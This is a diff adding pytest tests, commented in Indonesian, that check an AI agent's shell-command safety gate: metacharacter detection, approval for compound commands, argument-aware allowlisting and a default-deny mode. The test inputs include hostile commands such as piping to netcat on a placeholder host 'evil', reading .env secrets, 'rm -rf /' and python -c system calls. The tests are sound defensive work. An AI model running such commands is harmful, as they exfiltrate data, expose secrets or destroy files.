@@ -100,3 +100,91 @@ def test_path_traversal_blocked():
 def test_limits_configured():
     assert agent.COMMAND_TIMEOUT > 0
     assert agent.MAX_OUTPUT_SIZE > 0
+
+
+# ── H-04 (penguatan): deteksi command majemuk via metakarakter shell ────
+@pytest.mark.parametrize("cmd", [
+    "ls; whoami",            # separator ;
+    "ls && rm x",            # &&
+    "cat x || true",         # ||
+    "ls | grep foo",         # pipe
+    "echo $(whoami)",        # command substitution $()
+    "echo `whoami`",         # backtick
+    "cat x > out",           # redirect output
+    "wc < x",                # redirect input
+    "ls\nrm x",              # newline injection
+])
+def test_has_shell_metacharacter_true(cmd):
+    assert agent.has_shell_metacharacter(cmd), cmd
+
+
+@pytest.mark.parametrize("cmd", [
+    "ls -la", "pwd", "git status", "python3 --version", "echo hello world",
+    "uname -a", "df -h",
+])
+def test_has_shell_metacharacter_false(cmd):
+    assert not agent.has_shell_metacharacter(cmd), cmd
+
+
+# ── H-04 (penguatan): command majemuk SELALU butuh approval ─────────────
+@pytest.mark.parametrize("cmd", [
+    "ls; whoami",            # dulu: first-word 'ls' aman → AUTO-RUN (celah!)
+    "ls | nc evil 1234",
+    "git status; cat .env",  # bagian kedua menyentuh secret tapi lewat pipe
+    "pwd && python -c 'x'",
+])
+def test_compound_commands_require_approval(cmd):
+    # is_forbidden menangkap yang eksplisit berbahaya; sisanya tetap dangerous.
+    assert agent.is_dangerous(cmd), cmd
+
+
+# ── H-04 (penguatan): allowlist TERSTRUKTUR argumen-sadar ───────────────
+def test_python_dash_c_is_dangerous():
+    # Dulu: 'python' ada di SAFE first-word (via 'python --version') sehingga
+    # `python -c "…"` AUTO-RUN tanpa approval = eksekusi kode bebas. Sekarang
+    # argumen dievaluasi → hanya --version/-V yang aman.
+    assert agent.is_dangerous('python -c "import os; os.system(\'id\')"')
+    assert not agent.is_dangerous("python --version")
+    assert not agent.is_dangerous("python -V")
+
+
+def test_git_mutation_subcommands_are_dangerous():
+    assert agent.is_dangerous("git push")          # mutasi remote
+    assert agent.is_dangerous("git commit -m x")   # mutasi repo
+    assert agent.is_dangerous("git add .")
+    # read-only git tetap aman (tanpa approval).
+    assert not agent.is_dangerous("git status")
+    assert not agent.is_dangerous("git log --oneline")
+    assert not agent.is_dangerous("git diff")
+
+
+def test_is_safe_readonly_structured():
+    assert agent.is_safe_readonly("ls -la /tmp")
+    assert agent.is_safe_readonly("whoami")
+    assert agent.is_safe_readonly("python3 --version")
+    assert not agent.is_safe_readonly("python3 -c 'x'")
+    assert not agent.is_safe_readonly("ls; rm x")  # metakarakter
+    assert not agent.is_safe_readonly("rm -rf /")   # bukan program allowlist
+
+
+# ── H-04 (penguatan): strict allowlist mode (default-deny) ──────────────
+def test_strict_allowlist_default_off():
+    # Tanpa env → backward-compat: command tak terdaftar pakai first-word lama.
+    import os
+    old = os.environ.pop("BOTNESIA_AGENT_STRICT_ALLOWLIST", None)
+    try:
+        assert agent._strict_allowlist_enabled() is False
+    finally:
+        if old is not None:
+            os.environ["BOTNESIA_AGENT_STRICT_ALLOWLIST"] = old
+
+
+def test_strict_allowlist_on_denies_unknown(monkeypatch):
+    monkeypatch.setenv("BOTNESIA_AGENT_STRICT_ALLOWLIST", "1")
+    # program tak terdaftar → default-deny (butuh approval).
+    assert agent.is_dangerous("foobar --read")
+    # program terdaftar + arg cocok → tetap aman.
+    assert not agent.is_dangerous("git status")
+    # program terdaftar + arg tak cocok → tetap butuh approval.
+    assert agent.is_dangerous("git push")
+
